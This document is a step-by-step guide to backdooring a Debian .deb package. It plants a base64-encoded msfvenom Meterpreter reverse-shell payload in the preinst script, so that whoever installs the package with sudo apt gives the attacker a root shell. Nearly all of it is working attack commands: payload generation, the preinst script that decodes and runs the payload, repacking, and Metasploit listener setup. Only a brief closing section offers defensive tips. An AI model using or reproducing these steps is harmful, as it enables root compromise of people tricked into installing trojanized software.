 User Guide: Exploiting apt install via Malicious .deb Packages
🔥 Overview
This guide walks you through modifying and using the malicious .deb package to establish a Meterpreter reverse shell when a target installs it. The package leverages preinst scripts, which execute before installation starts—allowing code execution even if installation fails.

Since apt install requires sudo privileges, the obtained shell has root access by default.
⚙️ Step-by-Step Instructions
1️⃣ Extract & Modify the Package
First, decompress the .deb file to access the preinst script:
dpkg-deb -R malicious.deb extracted_folder/
Navigate to the DEBIAN/preinst file inside the extracted directory.
2️⃣ Set Up the Reverse Shell
You need to modify the script to listen on your IP instead of the default one. Generate a new Meterpreter payload:
msfvenom -p python/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > payload.py
🔹 Replace <YOUR_IP> with your attacker's IP address.
🔹 Set any preferred port (e.g., 4444, 5555, etc.).
Now, convert the payload to Base64 so it can be easily embedded inside the preinst script:
base64 payload.py > payload.b64
Copy the Base64-encoded content and paste it inside the preinst script in the extracted folder.
Modify preinst to decode and execute the payload:
#!/bin/bash
echo "<BASE64_ENCODED_PAYLOAD>" | base64 -d > /tmp/payload.py
python3 /tmp/payload.py &
🔹 Replace <BASE64_ENCODED_PAYLOAD> with your copied Base64 string.
3️⃣ Repack the .deb Package
After modifying preinst, rebuild the .deb package:
dpkg-deb -b extracted_folder/ new_malicious.deb
Ensure the file is now modified and ready for use.
4️⃣ Setting Up the Listener
On your attacker machine, start a listener to capture the connection:
msfconsole
Then, configure the listener:
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
exploit
🔹 Ensure <YOUR_IP> matches the one used in the payload.
🔹 Use the same port (LPORT=4444) you set in preinst.
5️⃣ Deliver & Execute the Payload
Now, the target needs to install the .deb file. If they install it using:
sudo apt install ./new_malicious.deb
💀 You instantly gain a root Meterpreter session!
Even if the target cancels or if installation fails, the preinst script executes before any verification, ensuring the payload runs.

⚠️ Key Exploitation Details
🔹 Why does this work?
preinst scripts execute before any validation, allowing malicious code to run before installation is approved.
Even if installation fails, the script still runs.
Since apt install requires sudo, the payload executes as root.
🔹 How can users protect themselves?

Always inspect .deb files before installing:
dpkg -c malicious.deb
Check for preinst scripts in the DEBIAN/ folder.
Avoid installing unverified .deb files.
Use sandboxed environments like VMs.
